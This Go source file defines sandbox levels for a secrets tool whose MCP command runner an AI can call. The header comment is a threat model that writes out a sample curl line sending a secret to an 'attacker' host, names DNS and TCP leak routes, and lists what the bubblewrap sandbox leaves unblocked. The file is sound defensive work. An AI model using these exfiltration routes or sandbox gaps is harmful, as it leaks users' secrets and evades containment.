package main

// Subprocess sandboxing for opq.
//
// SECURITY MODEL.
//
// The MCP `run_with_secrets` tool lets an AI choose an arbitrary
// command and arguments. Without isolation, the AI can move a
// resolved secret off-box through any network-capable binary on
// $PATH — `curl -H 'X-Leak: $SECRET' attacker`, DNS labels carrying
// the secret, outbound TCP, etc. Output redaction does not cover any
// of these paths; it only catches the subprocess accidentally
// echoing the secret on stdout/stderr.
//
// This file defines the platform-agnostic surface; the Linux
// implementation (sandbox_linux.go) wraps commands in bubblewrap
// (`bwrap`) to apply a network namespace and (optionally) a minimal
// filesystem view. Non-Linux platforms (sandbox_other.go) accept
// only SandboxNone.
//
// The sandbox blocks:
//   - external network egress (TCP/UDP/raw, IPv4/IPv6, DNS)
//   - under SandboxFull, reads of $HOME and /tmp (tmpfs overlays)
//
// The sandbox does NOT block:
//   - loopback communication with co-resident services
//   - timing / resource side-channels
//   - kernel-keyring or other inherited capabilities
//   - pre-compromise of binaries under /usr (ro-bound from host)

// SandboxProfile selects the isolation level applied to a child
// process. Higher values are strictly more restrictive than lower.
type SandboxProfile int

const (
	// SandboxNone runs the child with no isolation beyond stdlib
	// defaults. Used for CLI invocations the human operator controls
	// and for MCP calls that explicitly opted in to network access.
	SandboxNone SandboxProfile = iota
	// SandboxNet drops the network (unshare-net) while leaving the
	// host filesystem readable. This is the MCP default.
	SandboxNet
	// SandboxFull drops the network AND replaces /home and /tmp with
	// empty tmpfs mounts, exposing only minimal ro-binds for system
	// binaries and libraries.
	SandboxFull
)

// String renders the profile for human-facing messages and audit
// log entries.
func (p SandboxProfile) String() string {
	switch p {
	case SandboxNone:
		return "none"
	case SandboxNet:
		return "net"
	case SandboxFull:
		return "full"
	default:
		return "unknown"
	}
}
